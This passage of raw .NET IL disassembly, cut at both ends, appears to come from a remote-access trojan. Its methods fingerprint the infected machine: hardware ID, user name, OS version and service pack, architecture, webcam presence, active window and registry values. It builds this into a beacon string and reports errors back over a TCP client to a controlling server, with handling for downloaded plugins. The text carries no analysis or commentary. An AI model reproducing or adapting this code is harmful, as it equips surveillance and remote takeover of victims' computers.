      IL_0b0a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0b0f:  ldnull
      IL_0b10:  ldstr      "P"
      IL_0b15:  ldc.i4.1
      IL_0b16:  newarr     [mscorlib]System.Object
      IL_0b1b:  stloc.s    V_44
      IL_0b1d:  ldloc.s    V_44
      IL_0b1f:  ldc.i4.0
      IL_0b20:  ldsfld     string L::P
      IL_0b25:  stelem.ref
      IL_0b26:  ldloc.s    V_44
      IL_0b28:  ldnull
      IL_0b29:  ldnull
      IL_0b2a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0b2f:  ldsfld     object L::PLG
      IL_0b34:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0b39:  ldnull
      IL_0b3a:  ldstr      "c"
      IL_0b3f:  ldc.i4.1
      IL_0b40:  newarr     [mscorlib]System.Object
      IL_0b45:  stloc.s    V_44
      IL_0b47:  ldloc.s    V_44
      IL_0b49:  ldc.i4.0
      IL_0b4a:  ldsfld     class [System]System.Net.Sockets.TcpClient L::FCC
      IL_0b4f:  stelem.ref
      IL_0b50:  ldloc.s    V_44
      IL_0b52:  ldnull
      IL_0b53:  ldnull
      IL_0b54:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0b59:  leave      IL_0c11

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0b5e:  dup
      IL_0b5f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0b64:  stloc.s    V_36
      IL_0b66:  ldloc.s    V_36
      IL_0b68:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0b6d:  ldloc.s    V_36
      IL_0b6f:  stloc.s    V_37
      IL_0b71:  ldloc.0
      IL_0b72:  ldlen
      IL_0b73:  conv.ovf.i4
      IL_0b74:  ldc.i4.0
      IL_0b75:  ble.s      IL_0ba2

      IL_0b77:  ldloc.0
      IL_0b78:  ldc.i4.0
      IL_0b79:  ldelem.ref
      IL_0b7a:  ldstr      "Ex"
      IL_0b7f:  ldc.i4.0
      IL_0b80:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0b85:  ldc.i4.0
      IL_0b86:  ceq
      IL_0b88:  ldloc.0
      IL_0b89:  ldc.i4.0
      IL_0b8a:  ldelem.ref
      IL_0b8b:  ldstr      "PLG"
      IL_0b90:  ldc.i4.0
      IL_0b91:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0b96:  ldc.i4.0
      IL_0b97:  ceq
      IL_0b99:  or
      IL_0b9a:  brfalse.s  IL_0ba2

      IL_0b9c:  ldnull
      IL_0b9d:  stsfld     object L::PLG
      .try
      {
        IL_0ba2:  ldc.i4.5
        IL_0ba3:  newarr     [mscorlib]System.String
        IL_0ba8:  stloc.s    V_43
        IL_0baa:  ldloc.s    V_43
        IL_0bac:  ldc.i4.0
        IL_0bad:  ldstr      "ER"
        IL_0bb2:  stelem.ref
        IL_0bb3:  ldloc.s    V_43
        IL_0bb5:  ldc.i4.1
        IL_0bb6:  ldsfld     string L::Y
        IL_0bbb:  stelem.ref
        IL_0bbc:  ldloc.s    V_43
        IL_0bbe:  ldc.i4.2
        IL_0bbf:  ldloc.0
        IL_0bc0:  ldc.i4.0
        IL_0bc1:  ldelem.ref
        IL_0bc2:  stelem.ref
        IL_0bc3:  ldloc.s    V_43
        IL_0bc5:  ldc.i4.3
        IL_0bc6:  ldsfld     string L::Y
        IL_0bcb:  stelem.ref
        IL_0bcc:  ldloc.s    V_43
        IL_0bce:  ldc.i4.4
        IL_0bcf:  ldloc.s    V_37
        IL_0bd1:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_0bd6:  stelem.ref
        IL_0bd7:  ldloc.s    V_43
        IL_0bd9:  call       string [mscorlib]System.String::Concat(string[])
        IL_0bde:  call       bool L::Send(string)
        IL_0be3:  pop
        IL_0be4:  leave.s    IL_0c05

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0be6:  dup
        IL_0be7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0bec:  stloc.s    V_38
        IL_0bee:  ldloc.s    V_38
        IL_0bf0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0bf5:  ldloc.s    V_38
        IL_0bf7:  stloc.s    V_39
        IL_0bf9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0bfe:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0c03:  leave.s    IL_0c05

      }  // end handler
      IL_0c05:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0c0a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0c0f:  leave.s    IL_0c11

    }  // end handler
    IL_0c11:  ret
  } // end of method L::Ind

  .method public static string  inf() cil managed
  {
    // 
    .maxstack  5
    .locals init (string V_0,
             string V_1,
             string V_2,
             string V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.Exception V_8,
             class [mscorlib]System.Exception V_9,
             class [mscorlib]System.Exception V_10,
             class [mscorlib]System.Exception V_11,
             class [mscorlib]System.Exception V_12,
             class [mscorlib]System.Exception V_13,
             string[] V_14,
             class [mscorlib]System.Exception V_15,
             class [mscorlib]System.Exception V_16,
             class [mscorlib]System.Exception V_17,
             class [mscorlib]System.Exception V_18,
             string V_19,
             class [mscorlib]System.Exception V_20,
             class [mscorlib]System.Exception V_21,
             string V_22,
             string V_23,
             valuetype [mscorlib]System.DateTime V_24,
             valuetype [mscorlib]System.DateTime V_25,
             int32 V_26,
             string[] V_27)
    IL_0000:  ldstr      "ll"
    IL_0005:  ldsfld     string L::Y
    IL_000a:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_000f:  stloc.0
    .try
    {
      IL_0010:  ldstr      "vn"
      IL_0015:  ldstr      ""
      IL_001a:  call       object L::GTV(string,
                                         object)
      IL_001f:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0024:  ldstr      ""
      IL_0029:  ldc.i4.0
      IL_002a:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectEqual(object,
                                                                                                                                       object,
                                                                                                                                       bool)
      IL_002f:  brfalse.s  IL_0069

      IL_0031:  ldloc.0
      IL_0032:  ldsflda    string L::VN
      IL_0037:  call       string L::DEB(string&)
      IL_003c:  ldstr      " : C [ "
      IL_0041:  call       string L::HWD()
      IL_0046:  ldstr      " ]"
      IL_004b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0050:  stloc.s    V_22
      IL_0052:  ldloca.s   V_22
      IL_0054:  call       string L::ENB(string&)
      IL_0059:  ldsfld     string L::Y
      IL_005e:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0063:  stloc.0
      IL_0064:  leave      IL_00ef

      IL_0069:  ldloc.0
      IL_006a:  ldstr      "vn"
      IL_006f:  ldstr      ""
      IL_0074:  call       object L::GTV(string,
                                         object)
      IL_0079:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_007e:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_0083:  stloc.s    V_22
      IL_0085:  ldloca.s   V_22
      IL_0087:  call       string L::DEB(string&)
      IL_008c:  ldstr      "_"
      IL_0091:  call       string L::HWD()
      IL_0096:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_009b:  stloc.s    V_23
      IL_009d:  ldloca.s   V_23
      IL_009f:  call       string L::ENB(string&)
      IL_00a4:  ldsfld     string L::Y
      IL_00a9:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00ae:  stloc.0
      IL_00af:  leave.s    IL_00ef

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00b1:  dup
      IL_00b2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00b7:  stloc.s    V_4
      IL_00b9:  ldloc.s    V_4
      IL_00bb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00c0:  ldloc.s    V_4
      IL_00c2:  stloc.s    V_5
      IL_00c4:  ldloc.0
      IL_00c5:  call       string L::HWD()
      IL_00ca:  stloc.s    V_23
      IL_00cc:  ldloca.s   V_23
      IL_00ce:  call       string L::ENB(string&)
      IL_00d3:  ldsfld     string L::Y
      IL_00d8:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00dd:  stloc.0
      IL_00de:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00e3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00e8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00ed:  leave.s    IL_00ef

    }  // end handler
    .try
    {
      IL_00ef:  ldloc.0
      IL_00f0:  call       string [mscorlib]System.Environment::get_UserName()
      IL_00f5:  ldsfld     string L::Y
      IL_00fa:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00ff:  stloc.0
      IL_0100:  leave.s    IL_0137

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0102:  dup
      IL_0103:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0108:  stloc.s    V_7
      IL_010a:  ldloc.s    V_7
      IL_010c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0111:  ldloc.s    V_7
      IL_0113:  stloc.s    V_6
      IL_0115:  ldloc.0
      IL_0116:  ldstr      "\?\?"
      IL_011b:  ldsfld     string L::Y
      IL_0120:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0125:  stloc.0
      IL_0126:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_012b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0130:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0135:  leave.s    IL_0137

    }  // end handler
    .try
    {
      IL_0137:  ldloc.0
      IL_0138:  ldsfld     class [mscorlib]System.IO.FileInfo L::LO
      IL_013d:  callvirt   instance valuetype [mscorlib]System.DateTime [mscorlib]System.IO.FileSystemInfo::get_LastWriteTime()
      IL_0142:  stloc.s    V_24
      IL_0144:  ldloca.s   V_24
      IL_0146:  call       instance valuetype [mscorlib]System.DateTime [mscorlib]System.DateTime::get_Date()
      IL_014b:  stloc.s    V_25
      IL_014d:  ldloca.s   V_25
      IL_014f:  ldstr      "yy-MM-dd"
      IL_0154:  call       instance string [mscorlib]System.DateTime::ToString(string)
      IL_0159:  ldsfld     string L::Y
      IL_015e:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0163:  stloc.0
      IL_0164:  leave.s    IL_019b

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0166:  dup
      IL_0167:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_016c:  stloc.s    V_8
      IL_016e:  ldloc.s    V_8
      IL_0170:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0175:  ldloc.s    V_8
      IL_0177:  stloc.s    V_9
      IL_0179:  ldloc.0
      IL_017a:  ldstr      "\?\?"
      IL_017f:  ldsfld     string L::Y
      IL_0184:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0189:  stloc.0
      IL_018a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_018f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0194:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0199:  leave.s    IL_019b

    }  // end handler
    .try
    {
      IL_019b:  ldloc.0
      IL_019c:  ldsfld     object L::Fc
      IL_01a1:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_01a6:  ldsfld     string L::Y
      IL_01ab:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_01b0:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_01b5:  stloc.0
      IL_01b6:  leave.s    IL_01ed

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01b8:  dup
      IL_01b9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01be:  stloc.s    V_10
      IL_01c0:  ldloc.s    V_10
      IL_01c2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01c7:  ldloc.s    V_10
      IL_01c9:  stloc.s    V_11
      IL_01cb:  ldloc.0
      IL_01cc:  ldstr      "\?\?-\?\?-\?\?"
      IL_01d1:  ldsfld     string L::Y
      IL_01d6:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_01db:  stloc.0
      IL_01dc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01e1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01e6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01eb:  leave.s    IL_01ed

    }  // end handler
    IL_01ed:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer L::F
    IL_01f2:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Info()
    IL_01f7:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo::get_OSFullName()
    IL_01fc:  ldstr      "Microsoft"
    IL_0201:  ldstr      ""
    IL_0206:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                          string)
    IL_020b:  ldstr      "x"
    IL_0210:  ldstr      "X"
    IL_0215:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                          string)
    IL_021a:  ldstr      "X"
    IL_021f:  ldstr      "X"
    IL_0224:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                          string)
    IL_0229:  ldstr      "Windows"
    IL_022e:  ldstr      "Win"
    IL_0233:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                          string)
    IL_0238:  ldstr      bytearray (AE 00 ) 
    IL_023d:  ldstr      ""
    IL_0242:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                          string)
    IL_0247:  ldstr      bytearray (22 21 )                                           // "!
    IL_024c:  ldstr      ""
    IL_0251:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                          string)
    IL_0256:  ldstr      "  "
    IL_025b:  ldstr      " "
    IL_0260:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                          string)
    IL_0265:  ldstr      " Win"
    IL_026a:  ldstr      "Win"
    IL_026f:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                          string)
    IL_0274:  stloc.2
    IL_0275:  ldloc.0
    IL_0276:  ldstr      "..."
    IL_027b:  ldsfld     string L::Y
    IL_0280:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_0285:  stloc.0
    IL_0286:  ldloc.0
    IL_0287:  ldloc.2
    IL_0288:  ldc.i4.0
    IL_0289:  ldc.i4.5
    IL_028a:  callvirt   instance string [mscorlib]System.String::Substring(int32,
                                                                            int32)
    IL_028f:  ldsfld     string L::Y
    IL_0294:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_0299:  stloc.0
    .try
    {
      IL_029a:  ldloc.0
      IL_029b:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer L::F
      IL_02a0:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Info()
      IL_02a5:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo::get_OSFullName()
      IL_02aa:  ldstr      "Microsoft"
      IL_02af:  ldstr      ""
      IL_02b4:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_02b9:  ldstr      "Windows"
      IL_02be:  ldstr      "Win"
      IL_02c3:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_02c8:  ldstr      bytearray (AE 00 ) 
      IL_02cd:  ldstr      ""
      IL_02d2:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_02d7:  ldstr      bytearray (22 21 )                                           // "!
      IL_02dc:  ldstr      ""
      IL_02e1:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_02e6:  ldstr      "  "
      IL_02eb:  ldstr      " "
      IL_02f0:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_02f5:  ldstr      " Win"
      IL_02fa:  ldstr      "Win"
      IL_02ff:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_0304:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0309:  stloc.0
      IL_030a:  leave.s    IL_033c

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_030c:  dup
      IL_030d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0312:  stloc.s    V_12
      IL_0314:  ldloc.s    V_12
      IL_0316:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_031b:  ldloc.s    V_12
      IL_031d:  stloc.s    V_13
      IL_031f:  ldloc.0
      IL_0320:  ldstr      "\?\?"
      IL_0325:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_032a:  stloc.0
      IL_032b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0330:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0335:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_033a:  leave.s    IL_033c

    }  // end handler
    IL_033c:  ldloc.0
    IL_033d:  ldstr      "SP"
    IL_0342:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0347:  stloc.0
    .try
    {
      IL_0348:  call       class [mscorlib]System.OperatingSystem [mscorlib]System.Environment::get_OSVersion()
      IL_034d:  callvirt   instance string [mscorlib]System.OperatingSystem::get_ServicePack()
      IL_0352:  ldstr      " "
      IL_0357:  ldc.i4.m1
      IL_0358:  ldc.i4.0
      IL_0359:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                                string,
                                                                                                int32,
                                                                                                valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
      IL_035e:  stloc.s    V_14
      IL_0360:  ldloc.s    V_14
      IL_0362:  ldlen
      IL_0363:  conv.ovf.i4
      IL_0364:  ldc.i4.1
      IL_0365:  bne.un.s   IL_0373

      IL_0367:  ldloc.0
      IL_0368:  ldstr      "0"
      IL_036d:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0372:  stloc.0
      IL_0373:  ldloc.0
      IL_0374:  ldloc.s    V_14
      IL_0376:  ldloc.s    V_14
      IL_0378:  ldlen
      IL_0379:  conv.ovf.i4
      IL_037a:  ldc.i4.1
      IL_037b:  sub.ovf
      IL_037c:  ldelem.ref
      IL_037d:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0382:  stloc.0
      IL_0383:  leave.s    IL_03b5

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0385:  dup
      IL_0386:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_038b:  stloc.s    V_15
      IL_038d:  ldloc.s    V_15
      IL_038f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0394:  ldloc.s    V_15
      IL_0396:  stloc.s    V_16
      IL_0398:  ldloc.0
      IL_0399:  ldstr      "0"
      IL_039e:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_03a3:  stloc.0
      IL_03a4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_03a9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_03ae:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_03b3:  leave.s    IL_03b5

    }  // end handler
    .try
    {
      IL_03b5:  ldc.i4.s   38
      IL_03b7:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_03bc:  ldstr      "x86"
      IL_03c1:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_03c6:  brfalse.s  IL_03db

      IL_03c8:  ldloc.0
      IL_03c9:  ldstr      " x64"
      IL_03ce:  ldsfld     string L::Y
      IL_03d3:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_03d8:  stloc.0
      IL_03d9:  leave.s    IL_041e

      IL_03db:  ldloc.0
      IL_03dc:  ldstr      " x86"
      IL_03e1:  ldsfld     string L::Y
      IL_03e6:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_03eb:  stloc.0
      IL_03ec:  leave.s    IL_041e

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_03ee:  dup
      IL_03ef:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_03f4:  stloc.s    V_17
      IL_03f6:  ldloc.s    V_17
      IL_03f8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_03fd:  ldloc.s    V_17
      IL_03ff:  stloc.s    V_18
      IL_0401:  ldloc.0
      IL_0402:  ldsfld     string L::Y
      IL_0407:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_040c:  stloc.0
      IL_040d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0412:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0417:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_041c:  leave.s    IL_041e

    }  // end handler
    IL_041e:  call       bool L::Cam()
    IL_0423:  brfalse.s  IL_0438

    IL_0425:  ldloc.0
    IL_0426:  ldstr      "Yes"
    IL_042b:  ldsfld     string L::Y
    IL_0430:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_0435:  stloc.0
    IL_0436:  br.s       IL_0449

    IL_0438:  ldloc.0
    IL_0439:  ldstr      "No"
    IL_043e:  ldsfld     string L::Y
    IL_0443:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_0448:  stloc.0
    IL_0449:  ldloc.0
    IL_044a:  ldsfld     object L::Fc
    IL_044f:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_0454:  ldsfld     string L::Y
    IL_0459:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_045e:  ldstr      ".."
    IL_0463:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_0468:  ldsfld     string L::Y
    IL_046d:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_0472:  ldsfld     string L::VU
    IL_0477:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_047c:  ldsfld     string L::Y
    IL_0481:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_0486:  call       string L::ACT()
    IL_048b:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_0490:  ldsfld     string L::Y
    IL_0495:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_049a:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_049f:  stloc.0
    IL_04a0:  ldstr      ""
    IL_04a5:  stloc.3
    .try
    {
      IL_04a6:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer L::F
      IL_04ab:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_04b0:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_04b5:  ldstr      "Software\\"
      IL_04ba:  ldsfld     string L::RG
      IL_04bf:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_04c4:  ldc.i4.0
      IL_04c5:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::CreateSubKey(string,
                                                                                                                                    valuetype [mscorlib]Microsoft.Win32.RegistryKeyPermissionCheck)
      IL_04ca:  callvirt   instance string[] [mscorlib]Microsoft.Win32.RegistryKey::GetValueNames()
      IL_04cf:  stloc.s    V_27
      IL_04d1:  ldc.i4.0
      IL_04d2:  stloc.s    V_26
      IL_04d4:  br.s       IL_04fc

      IL_04d6:  ldloc.s    V_27
      IL_04d8:  ldloc.s    V_26
      IL_04da:  ldelem.ref
      IL_04db:  stloc.s    V_19
      IL_04dd:  ldloc.s    V_19
      IL_04df:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_04e4:  ldc.i4.s   32
      IL_04e6:  bne.un.s   IL_04f6

      IL_04e8:  ldloc.3
      IL_04e9:  ldloc.s    V_19
      IL_04eb:  ldstr      ","
      IL_04f0:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_04f5:  stloc.3
      IL_04f6:  ldloc.s    V_26
      IL_04f8:  ldc.i4.1
      IL_04f9:  add.ovf
      IL_04fa:  stloc.s    V_26
      IL_04fc:  ldloc.s    V_26
      IL_04fe:  ldloc.s    V_27
      IL_0500:  ldlen
      IL_0501:  conv.ovf.i4
      IL_0502:  blt.s      IL_04d6

      IL_0504:  leave.s    IL_052a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0506:  dup
      IL_0507:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
